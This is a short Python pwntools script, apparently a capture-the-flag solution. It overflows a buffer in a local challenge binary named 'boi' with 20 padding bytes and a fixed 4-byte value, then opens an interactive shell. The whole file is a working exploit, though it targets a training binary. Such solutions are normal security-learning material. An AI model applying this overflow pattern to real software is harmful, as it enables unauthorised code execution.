#!/usr/bin/env python3
from pwn import *
io = process("./boi")

offset = b"A" * 20              # Offset to the target value
value = b"\xee\xba\xf3\xca"     # New value to be set
payload = offset + value        # create the payload
io.recv()                       # Run the program and receive lines
io.send(payload)                # Send the payload
io.interactive()                # Interact with the shell
